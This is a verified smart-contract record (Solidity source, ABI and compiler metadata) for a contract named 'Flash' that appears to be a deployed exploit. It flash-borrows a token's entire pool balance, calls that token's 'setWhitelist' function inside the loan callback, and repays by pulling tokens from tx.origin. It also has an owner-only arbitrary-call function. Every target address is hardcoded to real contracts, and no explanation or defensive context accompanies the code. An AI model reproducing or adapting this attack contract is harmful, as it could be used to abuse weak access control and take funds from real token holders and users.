{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.2;\r\n\r\n\r\n\r\nlibrary TransferHelper {\r\n    function safeTransfer(\r\n        address token,\r\n        address to,\r\n        uint256 value\r\n    ) internal {\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));\r\n        require(success && (data.length == 0 || abi.decode(data, (bool))), \"ST\");\r\n    }\r\n\r\n    function safeTransferFrom(\r\n        address token,\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) internal {\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, value));\r\n        require(success && (data.length == 0 || abi.decode(data, (bool))), \"ST\");\r\n    }\r\n}\r\n\r\n\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n}\r\n\r\n\r\ninterface IPool {\r\n\r\n    function flash(address,uint256,uint256,bytes calldata) external;\r\n    function swap(address,bool,int256,uint160,bytes calldata) external returns (int256,int256);\r\n\r\n}\r\n\r\ninterface IWETH {\r\n    function deposit() external payable;\r\n}\r\n\r\ninterface IPanda {\r\n    function setWhitelist(address target, bool state) external;\r\n}\r\n\r\n\r\ncontract Flash {\r\n\r\n        address immutable owner;\r\n\r\n        constructor() {\r\n                owner = msg.sender;\r\n        }\r\n\r\n        function huiii() public payable {\r\n                uint bal = IERC20(0x9611FF5c56eaB38740f50049b14bdD78fe547828).balanceOf(0x4f1aE081755c6B75b099d5C65b902F6E151D32d8);\r\n                bytes memory data = abi.encode(bal);\r\n                IPool(0x4f1aE081755c6B75b099d5C65b902F6E151D32d8).flash(0xe522D1747b7ee64A7088e7679A5F9d8a5dF38618, bal, 0, data);\r\n        }\r\n\r\n        function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata data) public payable {\r\n                (uint256 amt1) = abi.decode(data, (uint256));\r\n                IPanda(0x9611FF5c56eaB38740f50049b14bdD78fe547828).setWhitelist(0x4f1aE081755c6B75b099d5C65b902F6E151D32d8, true);\r\n                if (fee0 > 0) TransferHelper.safeTransferFrom(0x9611FF5c56eaB38740f50049b14bdD78fe547828, tx.origin, msg.sender, amt1+fee0);\r\n        }\r\n\r\n        function callContract(address contractToCall, bytes memory data) public payable {\r\n                require(msg.sender == owner);\r\n                (bool suc, ) = contractToCall.call{value: msg.value}(data);\r\n                require(suc, \"Call failed\");\r\n        }\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"contractToCall\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"callContract\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"huiii\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fee0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"uniswapV3FlashCallback\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}]", "ContractName": "Flash", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2aa1b1c2e4bd0de899a21230ef55bdacb2a8b6b7e004435fdfbf11a247393090"}